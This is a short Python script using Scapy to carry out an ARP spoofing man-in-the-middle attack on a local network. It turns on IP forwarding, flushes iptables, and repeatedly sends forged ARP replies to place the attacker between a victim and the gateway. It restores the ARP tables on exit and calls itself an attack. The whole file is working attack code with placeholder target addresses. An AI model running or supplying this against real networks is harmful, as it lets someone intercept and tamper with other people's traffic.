import os
import time
from scapy.all import *


def enable_iproute():
	print("Enabling IP Routing...")
	file_path = "/proc/sys/net/ipv4/ip_forward"
	with open(file_path) as f:
		if f.read() == 1:
			print("IP Routing already enabled.")
			return
	with open(file_path, "w") as f:
		f.write("1")
	print("IP Routing Enabled.")


def get_mac(target_ip):
	ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), timeout=3, verbose=0)
	if ans:
		return ans[0][1].src


def arp_spoof(victim_ip, spoof_ip):
	victim_mac = getmacbyip(victim_ip)
	spoof_mac = getmacbyip(spoof_ip)
	arp_response = Ether(src=get_if_hwaddr(interface))/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
	sendp(arp_response, iface=interface, verbose=0)


def arp_restore(victim_ip, spoof_ip):
	victim_mac = getmacbyip(victim_ip)
	spoof_mac = getmacbyip(spoof_ip)
	arp_response = Ether(src=get_if_hwaddr(interface))/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=spoof_mac)
	sendp(arp_response, iface=interface, verbose=0, count=10)


if __name__ == "__main__":
	victim_ip = "1"
	spoof_ip = "" # gateway
	interface = "enp0s9"

	enable_iproute()

	os.system("sudo iptables --flush")
	queue_number = 1
	os.system("sudo iptables -i {} -A FORWARD -j ACCEPT".format(interface))

	try:
		while True:
			arp_spoof(spoof_ip, victim_ip)
			arp_spoof(victim_ip, spoof_ip)
			
			time.sleep(1)
	except KeyboardInterrupt:
		print("Keyboard Interrupt: stopping attack...")
		arp_restore(victim_ip, spoof_ip)
		arp_restore(spoof_ip, victim_ip)
		os.system("iptables --flush")
		print("Attack stopped.")
